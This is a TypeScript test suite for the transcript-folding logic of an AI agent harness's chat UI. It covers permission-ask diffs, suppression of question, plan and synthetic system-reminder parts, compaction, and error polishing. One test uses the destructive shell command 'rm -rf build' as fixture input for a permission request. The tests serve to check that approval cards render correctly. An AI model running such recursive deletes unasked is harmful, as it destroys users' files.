    expect(tool?.resources).toHaveLength(1);
  });

  it("never stacks a second ask's diff onto a claimed card", () => {
    // ASYMMETRY vs the prompting re-arrival above: a DIFFERENT request id for the
    // same file is a second write call, which gets its own card. Matching it onto
    // the first card would show the approver two stacked diffs for one proposed
    // write — the pending card must keep showing exactly the diff being decided.
    const state = createConversationFoldState();
    askToWrite(state, "app.py", "+first\n");
    askToWrite(state, "app.py", "+second\n", {
      request_id: "perm-2",
      preview: { kind: "diff", title: "app.py", content: "+second\n", path: "app.py" },
    });

    const tool = cloneTurns(state)[0].parts.find(
      (part): part is ToolConversationPart => part.kind === "tool",
    );
    expect(tool?.resources).toMatchObject([{ target: "app.py", preview: { content: "+first\n" } }]);
  });

  it("lets the post-write file.edited supersede the ask-time diff", () => {
    const state = createConversationFoldState();
    const path = "app.py";
    askToWrite(state, path, "+proposed\n");
    foldHarnessEvent(state, {
      event_type: "permission.resolved",
      request_id: "perm-1",
      option_id: "allow_once",
    });
    foldHarnessEvent(state, {
      event_type: "file.edited",
      event_id: "edit-1",
      path,
      insertions: 3,
      deletions: 1,
      preview: { kind: "diff", title: "app.py", content: "+written\n" },
    });

    const parts = cloneTurns(state)[0].parts;
    // One write card carrying ONE resource — the real post-write diff.
    expect(parts.filter((part) => part.kind === "file_edited")).toHaveLength(0);
    const tool = parts.find((part): part is ToolConversationPart => part.kind === "tool");
    expect(tool?.resources).toMatchObject([
      { target: path, diff: { insertions: 3, deletions: 1 }, preview: { content: "+written\n" } },
    ]);
  });

  it.each([
    ["reject_once", false],
    ["reject_always", false],
    ["cancelled", false],
    ["allow_once", true],
    ["allow_always", true],
  ])("keeps the pre-approval diff only when the ask was allowed (%s)", (optionId, kept) => {
    // ASYMMETRY: an allow leaves the proposed diff on the card (the write is
    // happening); a reject / cancel / timeout must pull it back off, or the
    // transcript reads as a record of a write that never happened.
    const state = createConversationFoldState();
    askToWrite(state, "app.py", "+proposed\n");
    foldHarnessEvent(state, {
      event_type: "permission.resolved",
      request_id: "perm-1",
      option_id: optionId,
    });

    const tool = cloneTurns(state)[0].parts.find(
      (part): part is ToolConversationPart => part.kind === "tool",
    );
    expect(tool?.resources ?? []).toHaveLength(kept ? 1 : 0);
  });

  it("attaches nothing for an ask that carries no diff", () => {
    // A shell / network ask has no preview — the card must stay exactly as it
    // was, with no empty file resource invented for it.
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "tool.call",
      message_id: "a1",
      tool_call_id: "prt_bash1",
      tool_name: "bash",
      input: { command: "rm -rf build" },
      status: "running",
    });
    foldHarnessEvent(state, {
      event_type: "permission.request",
      request_id: "perm-1",
      tool_call_id: "prt_bash1",
      permission_kind: "bash",
      canonical_kind: "shell",
      patterns: ["rm -rf build"],
      options: [{ option_id: "allow_once", name: "Allow once" }],
    });

    const tool = cloneTurns(state)[0].parts.find(
      (part): part is ToolConversationPart => part.kind === "tool",
    );
    expect(tool?.resources).toBeUndefined();
  });

  it("suppresses the question tool's generic card, keyed by tool name not id", () => {
    // Real opencode ids differ: the tool part is keyed by its PART id (prt_*),
    // while question.request carries the LLM CALL id — they never match. So
    // suppression keys on the tool NAME ("question"), not on an id join.
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "tool.call",
      message_id: "a1",
      tool_call_id: "prt_q1", // part id
      tool_name: "question",
      input: { questions: [{ question: "Which DB?" }] },
      status: "running",
    });
    // A streamed update carries the same part id but NO tool_name — must still skip.
    foldHarnessEvent(state, {
      event_type: "tool.call_update",
      tool_call_id: "prt_q1",
      status: "completed",
    });
    foldHarnessEvent(state, {
      event_type: "question.request",
      request_id: "req-1",
      tool_call_id: "call_xyz", // LLM call id — deliberately != the part id
      questions: [{ question: "Which DB?", options: [{ label: "pg" }] }],
    });

    // Only the dedicated question card remains; the generic tool card is gone.
    const parts = cloneTurns(state)[0].parts;
    expect(parts.map((part) => part.kind)).toEqual(["question"]);
  });

  it("suppresses the replayed question tool card too (part.created)", () => {
    // Reopening a chat replays a finalized question tool as part.created with
    // type:"tool_call" — that path must suppress it too.
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "part.created",
      part: {
        part_id: "prt_q1",
        message_id: "a1",
        type: "tool_call",
        name: "question",
        state: "completed",
      },
    });
    foldHarnessEvent(state, {
      event_type: "question.request",
      request_id: "req-1",
      tool_call_id: "call_xyz",
      questions: [{ question: "Which DB?", options: [{ label: "pg" }] }],
    });

    const parts = cloneTurns(state)[0].parts;
    expect(parts.map((part) => part.kind)).toEqual(["question"]);
  });

  it("suppresses the plan_present card that drives the approval surface", () => {
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "tool.call",
      message_id: "a1",
      tool_call_id: "prt_plan1",
      tool_name: "plan_present",
      status: "completed",
    });
    foldHarnessEvent(state, {
      event_type: "question.request",
      request_id: "req-1",
      kind: "plan_approval",
      tool_call_id: "call_plan",
      questions: [{ question: "Approve this plan?", options: [{ label: "Approve" }] }],
    });

    const parts = cloneTurns(state)[0].parts;
    expect(parts.map((part) => part.kind)).toEqual(["question"]);
  });

  // Both only announce the agent leaving plan mode, so neither earns a card.
  it.each(["plan", "plan_exit"])("suppresses the %s plan-mode control card", (name) => {
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "tool.call",
      message_id: "a1",
      tool_call_id: `prt_${name}`,
      tool_name: name,
      status: "completed",
    });

    expect(cloneTurns(state)[0].parts).toEqual([]);
  });

  it("does not suppress a tool whose name merely contains a suppressed word", () => {
    // Suppression is exact-set membership on the lowercased name, not a substring
    // match — a real `planner` / `question_bank` tool must still render its card,
    // or the `plan` entry would silently swallow unrelated tools.
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    for (const name of ["planner", "plan_present_results", "question_bank"]) {
      foldHarnessEvent(state, {
        event_type: "tool.call",
        message_id: "a1",
        tool_call_id: `prt_${name}`,
        tool_name: name,
        status: "completed",
      });
    }

    const tools = cloneTurns(state)[0].parts.filter((part) => part.kind === "tool");
    expect(tools.map((part) => part.kind === "tool" && part.name)).toEqual([
      "planner",
      "plan_present_results",
      "question_bank",
    ]);
  });

  it("surfaces a plan_approval's plan_markdown", () => {
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "question.request",
      request_id: "req-plan",
      kind: "plan_approval",
      plan_markdown: "## Plan\n\n1. Do X\n2. Do Y",
      questions: [{ question: "Approve this plan?", options: [{ label: "Approve" }] }],
    });
    const part = cloneTurns(state)[0].parts[0];
    expect(part.kind).toBe("question");
    if (part.kind === "question") {
      expect(part.questionKind).toBe("plan_approval");
      expect(part.planMarkdown).toBe("## Plan\n\n1. Do X\n2. Do Y");
    }
  });

  it.each([
    ["the answer after the ask", false],
    ["the answer before the ask", true],
  ])("keeps a recorded answer's note, and the machine's later echo does not unsay it (%s)", (_name, answerFirst) => {
    const state = createConversationFoldState();
    const ask = {
      event_type: "question.request",
      request_id: "req-plan",
      kind: "plan_approval",
      questions: [{ question: "Approve this plan?", options: [{ label: "Approve" }] }],
    };
    const recorded = { event_type: "question.answered", request_id: "req-plan", answers: [["Approve"]], note: "Skip it." };
    const echo = { event_type: "question.answered", request_id: "req-plan", answers: [["Approve"]] };
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    if (answerFirst) foldHarnessEvent(state, recorded);
    foldHarnessEvent(state, ask);
    if (!answerFirst) foldHarnessEvent(state, recorded);
    foldHarnessEvent(state, echo);
    const part = cloneTurns(state)[0].parts[0];
    expect(part.kind === "question" && part.status).toBe("answered");
    expect(part.kind === "question" && part.note).toBe("Skip it.");
  });

  it("folds a blob reference out of a JSON-string sql result", () => {
    // MCP-hosted tools (sql.query, the blob tools) serialize their result to TEXT, so
    // the spilled `{…, blob:{sha256}}` envelope arrives as a string. The fold must parse
    // it (and read result_name / ref_type from INSIDE the blob) — else the result renders
    // as a raw JSON dump instead of a blob preview card.
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "part.created",
      message_id: "a1",
      part: {
        part_id: "p-sql-1",
        message_id: "a1",
        type: "tool_call",
        call_id: "call-sql",
        name: "sql.query",
        state: "running",
        input: { sql: "SELECT ..." },
      },
    });
    foldHarnessEvent(state, {
      event_type: "tool.call_update",
      tool_call_id: "call-sql",
      status: "completed",
      output: JSON.stringify({
        returned: [[1, "returned", 10]],
        row_count: 5940,
        truncated: true,
        blob: {
          sha256: "06768ae6003c0840deadbeef",
          size: 1388900,
          media_type: "application/json",
          ref_type: "rows",
          result_name: "Orders fanned out (blob demo)",
        },
        cost_warnings: [],
      }),
    });

    const toolPart = cloneTurns(state)[0].parts.find((part) => part.kind === "tool");
    expect(toolPart?.kind).toBe("tool");
    if (toolPart?.kind === "tool") {
      expect(toolPart.references).toHaveLength(1);
      expect(toolPart.references?.[0]).toMatchObject({
        handle: "06768ae6003c0840deadbeef",
        name: "Orders fanned out (blob demo)", // read from INSIDE the blob envelope
        refType: "rows", // → renders as a table, not raw JSON
      });
    }
  });

  it("folds a blob reference from a call_tool-wrapped sql result", () => {
    // Most alkera tools run through the generic `call_tool` wrapper, so the result (with
    // its spilled blob) arrives nested under `result` AND as a JSON string. The fold must
    // parse + unwrap, else the SQL result renders as a raw JSON dump.
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "part.created",
      message_id: "a1",
      part: {
        part_id: "p-ct-1",
        message_id: "a1",
        type: "tool_call",
        call_id: "call-ct",
        name: "call_tool",
        state: "running",
        input: { name: "sql.query", args: { sql: "SELECT ..." } },
      },
    });
    foldHarnessEvent(state, {
      event_type: "tool.call_update",
      tool_call_id: "call-ct",
      status: "completed",
      output: JSON.stringify({
        result: {
          columns: ["order_id", "status"],
          preview_rows: [[1, "returned"]],
          row_count: 5940,
          truncated: true,
          blob: {
            sha256: "5bbeb8c3deadbeef",
            ref_type: "rows",
            result_name: "Orders fanned out (blob demo)",
          },
        },
      }),
    });

    const toolPart = cloneTurns(state)[0].parts.find((part) => part.kind === "tool");
    expect(toolPart?.kind).toBe("tool");
    if (toolPart?.kind === "tool") {
      expect(toolPart.references).toHaveLength(1);
      expect(toolPart.references?.[0]).toMatchObject({
        handle: "5bbeb8c3deadbeef",
        name: "Orders fanned out (blob demo)",
        refType: "rows",
      });
    }
  });

  it("keeps a non-question tool card whose name is unrelated", () => {
    // Guard against over-suppression — only "question" is dropped.
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "tool.call",
      message_id: "a1",
      tool_call_id: "prt_b1",
      tool_name: "bash",
      input: { command: "ls" },
      status: "completed",
    });
    const parts = cloneTurns(state)[0].parts;
    expect(parts.map((part) => part.kind)).toEqual(["tool"]);
  });

  it("folds streamed compaction events into an assistant work part", () => {
    const state = createConversationFoldState();
    foldHarnessEvent(state, {
      event_type: "session.next.compaction.started",
      event_id: "compact-1",
      data: { reason: "manual" },
    });
    foldHarnessEvent(state, {
      event_type: "session.next.compaction.delta",
      data: { text: "Kept the core constraints.\n" },
    });
    foldHarnessEvent(state, {
      event_type: "session.next.compaction.delta",
      text: "Preserved the source chat route.",
    });
    foldHarnessEvent(state, {
      event_type: "session.next.compaction.ended",
      data: { text: "Kept the core constraints.\nPreserved the source chat route." },
    });

    const turns = cloneTurns(state);
    expect(turns).toHaveLength(1);
    expect(turns[0]).toMatchObject({
      author: "assistant",
      parts: [
        {
          id: "compact-1",
          kind: "compaction",
          title: "Manual compaction",
          text: "Kept the core constraints.\nPreserved the source chat route.",
          streaming: false,
        },
      ],
    });
  });

  // A small conversation to compact: u1/a1 (the pair the daemon elides) plus
  // u2 (the retained tail boundary). Returns a folded state ready for a
  // compaction.applied event.
  function foldThreeTurnConversation(): ReturnType<typeof createConversationFoldState> {
    const state = createConversationFoldState();
    for (const [id, role, text] of [
      ["u1", "user", "First question"],
      ["a1", "assistant", "First answer"],
      ["u2", "user", "Second question"],
    ] as const) {
      foldHarnessEvent(state, { event_type: "message.created", message_id: id, role });
      foldHarnessEvent(state, {
        event_type: "part.created",
        message_id: id,
        part: { part_id: `${id}-t`, message_id: id, type: "text", text },
      });
    }
    return state;
  }

  it("dims the turns a compaction elided and keeps the retained tail bright", () => {
    const state = foldThreeTurnConversation();
    foldHarnessEvent(state, {
      event_type: "compaction.applied",
      summarised_message_ids: ["u1", "a1"],
      summary_text: "Kept the core constraints and the active task.",
    });

    const turns = cloneTurns(state);
    const byId = Object.fromEntries(turns.map((turn) => [turn.id, turn]));
    // Everything before the retained boundary is dimmed (out of live context)…
    expect(byId.u1.cleared).toBe(true);
    expect(byId.a1.cleared).toBe(true);
    // …the retained tail stays bright (still in the agent's context).
    expect(byId.u2.cleared).toBeUndefined();

    // The summary surfaces as a bright boundary card (its own new turn), with
    // the text taken from the event's `summary_text`.
    const summaryTurn = turns[turns.length - 1];
    expect(summaryTurn.cleared).toBeUndefined();
    expect(summaryTurn.parts).toEqual([
      {
        id: expect.any(String),
        kind: "compaction",
        title: "Compaction",
        text: "Kept the core constraints and the active task.",
        streaming: false,
        // What the card states: how many turns went behind the summary.
        summarisedTurns: 2,
      },
    ]);
  });

  it("dims nothing for an empty elided set but still shows the summary card", () => {
    const state = foldThreeTurnConversation();
    foldHarnessEvent(state, {
      event_type: "compaction.applied",
      summarised_message_ids: [],
      summary_text: "Nothing to elide.",
    });

    const turns = cloneTurns(state);
    expect(turns.filter((turn) => turn.cleared)).toHaveLength(0);
    expect(turns[turns.length - 1].parts[0]).toMatchObject({
      kind: "compaction",
      text: "Nothing to elide.",
    });
  });

  it("a second compaction dims the tail the first one retained", () => {
    const state = foldThreeTurnConversation();
    foldHarnessEvent(state, {
      event_type: "compaction.applied",
      summarised_message_ids: ["u1", "a1"],
      summary_text: "First summary.",
    });
    // A later turn keeps going, then a second compaction elides the tail (u2)
    // that the first one had retained.
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a2", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "part.created",
      message_id: "a2",
      part: { part_id: "a2-t", message_id: "a2", type: "text", text: "Second answer" },
    });
    foldHarnessEvent(state, {
      event_type: "compaction.applied",
      summarised_message_ids: ["u2", "a2"],
      summary_text: "Second summary.",
    });

    const byId = Object.fromEntries(cloneTurns(state).map((turn) => [turn.id, turn]));
    expect(byId.u2.cleared).toBe(true);
    expect(byId.a2.cleared).toBe(true);
  });

  it("folds bare tool attachments into reference chips with derived names", () => {
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "part.created",
      message_id: "a1",
      part: {
        part_id: "p1",
        message_id: "a1",
        type: "tool_call",
        call_id: "t1",
        name: "sql.query",
        state: "completed",
        attachments: ["sha-aaa", "sha-bbb"],
      },
    });
    const tool = cloneTurns(state)[0].parts.find((part) => part.kind === "tool");
    expect(tool?.kind === "tool" && tool.references).toEqual([
      { handle: "sha-aaa", name: "Result 1" },
      { handle: "sha-bbb", name: "Result 2" },
    ]);
  });

  // Typed references carry the LLM's own name + type, so they win over both of
  // the untyped sources and never stack a second chip.
  it.each([
    ["bare attachments", { attachments: ["sha-aaa"] }],
    ["a spilled output.blob", { output: { blob: { sha256: "sha-aaa" } } }],
  ])("prefers typed references over %s", (_label, untyped) => {
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "part.created",
      message_id: "a1",
      part: {
        part_id: "p1",
        message_id: "a1",
        type: "tool_call",
        call_id: "t1",
        name: "sql.query",
        state: "completed",
        ...untyped,
        references: [{ handle: "sha-aaa", name: "Q3 revenue by region", ref_type: "rows" }],
      },
    });
    const tool = cloneTurns(state)[0].parts.find((part) => part.kind === "tool");
    expect(tool?.kind === "tool" && tool.references).toEqual([
      { handle: "sha-aaa", name: "Q3 revenue by region", refType: "rows" },
    ]);
  });

  it("names a spilled output.blob reference from the LLM's result_name", () => {
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "part.created",
      message_id: "a1",
      part: {
        part_id: "p1",
        message_id: "a1",
        type: "tool_call",
        call_id: "t1",
        name: "sql.query",
        state: "completed",
        output: {
          columns: ["x"],
          blob: { sha256: "sha-1", size: 9999 },
          result_name: "Q3 revenue by region",
        },
      },
    });
    const tool = cloneTurns(state)[0].parts.find((part) => part.kind === "tool");
    expect(tool?.kind === "tool" && tool.references).toEqual([
      { handle: "sha-1", name: "Q3 revenue by region" },
    ]);
  });

  it("names an unnamed spill from its tool and reads its ref_type", () => {
    const state = createConversationFoldState();
    foldHarnessEvent(state, {
      event_type: "tool.call",
      tool_call_id: "t1",
      message_id: "a1",
      tool_name: "bash",
      status: "running",
    });
    foldHarnessEvent(state, {
      event_type: "tool.call_update",
      tool_call_id: "t1",
      status: "completed",
      output: { blob: { sha256: "sha-2" }, ref_type: "text" },
    });
    const tool = cloneTurns(state)[0].parts.find((part) => part.kind === "tool");
    expect(tool?.kind === "tool" && tool.references).toEqual([
      { handle: "sha-2", name: "Bash result", refType: "text" },
    ]);
  });

  it("a later attachment-free tool update keeps the folded references", () => {
    const state = createConversationFoldState();
    foldHarnessEvent(state, {
      event_type: "tool.call",
      tool_call_id: "t2",
      message_id: "a1",
      tool_name: "sql",
      status: "running",
      attachments: ["sha-x"],
    });
    foldHarnessEvent(state, {
      event_type: "tool.call_update",
      tool_call_id: "t2",
      status: "completed",
    });
    const tool = cloneTurns(state)[0].parts.find(
      (part) => part.kind === "tool" && part.callId === "t2",
    );
    expect(tool?.kind === "tool" && tool.references).toEqual([
      { handle: "sha-x", name: "Result 1" },
    ]);
    expect(tool?.kind === "tool" && tool.state).toBe("completed");
  });

  it("merges daemon user events into the optimistic user turn", () => {
    const state = createConversationFoldState();
    addOptimisticUserTurn(state, "local-1", "Run tests");

    foldHarnessEvent(state, { event_type: "message.created", message_id: "u-real", role: "user" });
    foldHarnessEvent(state, {
      event_type: "part.created",
      message_id: "u-real",
      part: { part_id: "u-real-text", message_id: "u-real", type: "text", text: "Run tests" },
    });

    const turns = cloneTurns(state);
    expect(turns).toHaveLength(1);
    expect(turns[0]).toMatchObject({
      id: "u-real",
      author: "user",
      parts: [{ kind: "text", text: "Run tests" }],
    });
  });

  it("ignores OpenCode lifecycle metadata and raw event names", () => {
    const state = createConversationFoldState();

    for (const event of [
      // Steering on the model's own message. (A synthetic part whose message
      // row never lands is a different case: it is shown as a notice when the
      // turn ends, see stopNotes.fold.test.ts.)
      { event_type: "message.created", message_id: "a1", role: "assistant" },
      {
        event_type: "part.created",
        message_id: "a1",
        part: { part_id: "synthetic", type: "text", text: "hidden", synthetic: true },
      },
      { event_type: "agent.custom_event" },
      { event_type: "session.created" },
      { event_type: "session.updated" },
      { event_type: "session.diff" },
      { event_type: "session.next.agent.switched" },
      { event_type: "session.next.model.switched" },
      { event_type: "session.status_changed", status: "idle" },
      { event_type: "message.completed", message_id: "a1" },
      { event_type: "no credit available (seat or pool)" },
    ] satisfies HarnessEvent[]) {
      foldHarnessEvent(state, event);
    }

    const turns = cloneTurns(state);
    // The announced message is the only turn, and nothing was put on it.
    expect(turns.map((turn) => turn.id)).toEqual(["a1"]);
    expect(turns.flatMap((turn) => turn.parts)).toEqual([]);
    const serialized = JSON.stringify(turns);
    expect(serialized).not.toContain("hidden");
    expect(serialized).not.toContain("agent.custom_event");
    expect(serialized).not.toContain("session.next.agent.switched");
    expect(serialized).not.toContain("message.completed");
    expect(serialized).not.toContain("no credit available (seat or pool)");
  });

  it("suppresses a synthetic steering part mid-stream", () => {
    const state = createConversationFoldState();

    // The live, in-progress case the fix exists for: a synthetic part (the
    // plan-mode reminder / "plan approved" nudge) streams part.started + token
    // chunks and NO finalizing part.created has arrived yet. The `synthetic`
    // flag rides on part.started's `initial`; without honoring it on the live
    // path the reminder flashes into the transcript while streaming. (We
    // deliberately omit the terminal synthetic part.created so this test fails
    // if foldPartStarted / appendTextChunk lose their check — the part.created
    // removePart can't be what's doing the hiding here.)
    for (const event of [
      {
        event_type: "part.started",
        message_id: "u1",
        part_id: "sys-reminder",
        part_type: "text",
        initial: { type: "text", text: "<system-reminder>", synthetic: true },
      },
      {
        event_type: "agent.message_chunk",
        message_id: "u1",
        part_id: "sys-reminder",
        text: "You are in build mode. Do not...",
      },
      // A real assistant reply streaming concurrently must still render.
      {
        event_type: "part.started",
        message_id: "a1",
        part_id: "reply",
        part_type: "text",
        initial: { type: "text", text: "Here is the answer." },
      },
    ] satisfies HarnessEvent[]) {
      foldHarnessEvent(state, event);
    }

    const turns = cloneTurns(state);
    const allText = turns.flatMap((turn) => turn.parts).filter((part) => part.kind === "text");
    // The synthetic reminder never surfaces; only the genuine reply does.
    expect(allText.map((part) => part.text)).toEqual(["Here is the answer."]);
    expect(JSON.stringify(turns)).not.toContain("system-reminder");
    expect(JSON.stringify(turns)).not.toContain("build mode");
  });

  it("clears synthetic-part suppression on conversation.cleared", () => {
    const state = createConversationFoldState();
    // Suppress a synthetic part, then clear — the suppression set must reset so
    // a later part reusing the same id (opencode ids are unique, but the set
    // would otherwise leak for the session's life) is not wrongly dropped.
    foldHarnessEvent(state, {
      event_type: "part.started",
      message_id: "u1",
      part_id: "sys-reminder",
      part_type: "text",
      initial: { type: "text", text: "<system-reminder>", synthetic: true },
    });
    expect(state.suppressedSyntheticPartIds.size).toBe(1);

    foldHarnessEvent(state, { event_type: "conversation.cleared" } satisfies HarnessEvent);
    expect(state.suppressedSyntheticPartIds.size).toBe(0);

    // A NON-synthetic part reusing that id now renders normally.
    foldHarnessEvent(state, {
      event_type: "part.started",
      message_id: "a2",
      part_id: "sys-reminder",
      part_type: "text",
      initial: { type: "text", text: "Real reply." },
    } satisfies HarnessEvent);
    const texts = cloneTurns(state)
      .flatMap((turn) => turn.parts)
      .filter((part) => part.kind === "text");
    expect(texts.map((part) => part.text)).toEqual(["Real reply."]);
  });

  it("never renders a mode-switch reminder (it rides the synthetic channel)", () => {
    // The mode-switch notice ("the user just switched you from X to Y") is injected
    // as a synthetic <system-reminder> part — model-only, never shown to the user.
    const state = createConversationFoldState();
    for (const event of [
      {
        event_type: "part.started",
        message_id: "u1",
        part_id: "mode-switch",
        part_type: "text",
        initial: {
          type: "text",
          synthetic: true,
          text:
            "<system-reminder>\nThe user just switched the permission mode from default " +
            "to read-only. Every write, edit, and mutating command is refused this session." +
            "\n</system-reminder>",
        },
      },
      {
        event_type: "part.started",
        message_id: "a1",
        part_id: "reply",
        part_type: "text",
        initial: { type: "text", text: "Understood — switching to investigation." },
      },
    ] satisfies HarnessEvent[]) {
      foldHarnessEvent(state, event);
    }
    const turns = cloneTurns(state);
    const serialized = JSON.stringify(turns);
    expect(serialized).not.toContain("just switched the permission mode");
    expect(serialized).not.toContain("system-reminder");
    const texts = turns.flatMap((turn) => turn.parts).filter((part) => part.kind === "text");
    expect(texts.map((part) => part.text)).toEqual(["Understood — switching to investigation."]);
  });

  it("suppresses a synthetic reasoning part but keeps real thinking", () => {
    const state = createConversationFoldState();
    // The suppression branch covers reasoning too (appendTextChunk runs for both
    // text + thinking). A flagged reasoning part must vanish; an UNflagged one
    // must still render — proving the flag, not the part type, is the gate.
    for (const event of [
      {
        event_type: "part.started",
        message_id: "a1",
        part_id: "fake-think",
        part_type: "reasoning",
        initial: { type: "reasoning", text: "injected scaffold reasoning", synthetic: true },
      },
      {
        event_type: "agent.thought_chunk",
        message_id: "a1",
        part_id: "fake-think",
        text: "injected scaffold reasoning",
      },
      {
        event_type: "part.started",
        message_id: "a1",
        part_id: "real-think",
        part_type: "reasoning",
        initial: { type: "reasoning", text: "Let me consider the schema." },
      },
    ] satisfies HarnessEvent[]) {
      foldHarnessEvent(state, event);
    }
    const thinking = cloneTurns(state)
      .flatMap((t) => t.parts)
      .filter((p) => p.kind === "thinking");
    expect(thinking.map((p) => p.text)).toEqual(["Let me consider the schema."]);
    expect(JSON.stringify(cloneTurns(state))).not.toContain("injected scaffold");
  });

  it("drops a late delta for an id already flagged synthetic", () => {
    const state = createConversationFoldState();
    // Ordering hazard: the finalizing part.created (which carries the flag)
    // lands first and records the id; a straggler delta for the same part must
    // still be dropped, not resurrect a visible part.
    for (const event of [
      {
        event_type: "part.created",
        message_id: "u1",
        part: { part_id: "late", type: "text", text: "<system-reminder>...", synthetic: true },
      },
      {
        event_type: "agent.message_chunk",
        message_id: "u1",
        part_id: "late",
        text: "stale synthetic token",
      },
    ] satisfies HarnessEvent[]) {
      foldHarnessEvent(state, event);
    }
    expect(
      cloneTurns(state)
        .flatMap((t) => t.parts)
        .filter((p) => p.kind === "text"),
    ).toEqual([]);
    expect(JSON.stringify(cloneTurns(state))).not.toContain("stale synthetic token");
  });

  it("renders a redacted part's placeholder", () => {
    const state = createConversationFoldState();
    // A redacted part is real content with a placeholder body; redacted=true but
    // synthetic/ignored are false, so it must render (NOT be stripped).
    foldHarnessEvent(state, {
      event_type: "part.created",
      message_id: "a1",
      part: { part_id: "r1", type: "text", text: "[redacted secret]", redacted: true },
    } satisfies HarnessEvent);
    const texts = cloneTurns(state)
      .flatMap((t) => t.parts)
      .filter((p) => p.kind === "text");
    expect(texts.map((p) => p.text)).toEqual(["[redacted secret]"]);
  });

  it("converts a structured refusal into one polished assistant error", () => {
    const state = createConversationFoldState();

    foldHarnessEvent(state, {
      event_type: "session.status_changed",
      status: "error",
      detail: "no credit available (seat or pool)",
    });
    foldHarnessEvent(state, {
      event_type: "message.completed",
      error: "no credit available (seat or pool)",
    });
    foldHarnessEvent(state, {
      event_type: "session.status_changed",
      status: "error",
      detail: "agent exited unexpectedly (rc=-15)",
    });

    expect(cloneTurns(state)).toEqual([
      expect.objectContaining({
        author: "assistant",
        status: "error",
        parts: [
          expect.objectContaining({
            kind: "system",
            text: REFUSED,
            tone: "error",
          }),
        ],
      }),
    ]);
  });

  it("polishes a lone crash error and never shows the raw string", () => {
    const state = createConversationFoldState();

    foldHarnessEvent(state, {
      event_type: "session.status_changed",
      status: "error",
      detail: "agent exited unexpectedly (rc=-15)",
    });

    const turns = cloneTurns(state);
    expect(turns).toHaveLength(1);
    expect(turns[0]).toMatchObject({
      author: "assistant",
      status: "error",
      parts: [expect.objectContaining({ kind: "system", tone: "error" })],
    });
    const text = (turns[0].parts[0] as { text: string }).text;
    expect(text).toContain("stopped unexpectedly");
    expect(JSON.stringify(turns)).not.toContain("rc=-15");
  });

  it("keeps the raw crash string out of a turn.finished summary", () => {
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "turn.started", turn_id: "t1" });
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "agent.message_chunk",
      message_id: "a1",
      part_id: "tx",
      text: "partial",
      is_final: true,
    });
    foldHarnessEvent(state, {
      event_type: "turn.finished",
      event_id: "sum-1",
      stop_reason: "error",
      error_detail: "agent exited unexpectedly (rc=-15)",
    });

    const turns = cloneTurns(state);
    expect(turns).toHaveLength(1);
    expect(turns[0].status).toBe("error");
    const summary = turns[0].parts.find((part) => part.kind === "turn_summary");
    expect(summary).toMatchObject({ kind: "turn_summary", errorDetail: null });
    expect(JSON.stringify(turns)).not.toContain("rc=-15");
  });

  it.each([-15, -9, 137, 1])("polishes an agent exit whatever the code (rc=%i)", (rc) => {
    const state = createConversationFoldState();
    foldHarnessEvent(state, {
      event_type: "session.status_changed",
      status: "error",
      detail: `agent exited unexpectedly (rc=${rc})`,
    });

    const serialized = JSON.stringify(cloneTurns(state));
    expect(serialized).not.toContain("agent exited unexpectedly");
    expect(serialized).not.toContain(`rc=${rc}`);
  });

  it("reports a mirror's restart sentence once, from the status line only", () => {
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "turn.started", turn_id: "t1" });
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "agent.message_chunk",
      message_id: "a1",
      part_id: "tx",
      text: "partial",
      is_final: true,
    });
    // The cloud mirror already put the crash in the reader's words, so the
    // summary must stay quiet about it exactly as it does for the raw string.
    foldHarnessEvent(state, {
      event_type: "turn.finished",
      event_id: "sum-1",
      stop_reason: "error",
      error_detail: "The workspace restarted while answering; ask the question again.",
    });
    foldHarnessEvent(state, {
      event_type: "session.status_changed",
      status: "error",
      detail: "The workspace restarted while answering; ask the question again.",
    });

    const turns = cloneTurns(state);
    const summary = turns.flatMap((t) => t.parts).find((p) => p.kind === "turn_summary");
    expect(summary).toMatchObject({ kind: "turn_summary", errorDetail: null });
    const errorParts = turns
      .flatMap((t) => t.parts)
      .filter((p) => p.kind === "system" && p.tone === "error");
    expect(errorParts).toHaveLength(1);
    expect(errorParts[0]).toMatchObject({
      text: "The workspace restarted while answering; ask the question again.",
    });
  });

  it("shows a genuine turn error once and drops the crash teardown after it", () => {
    const state = createConversationFoldState();
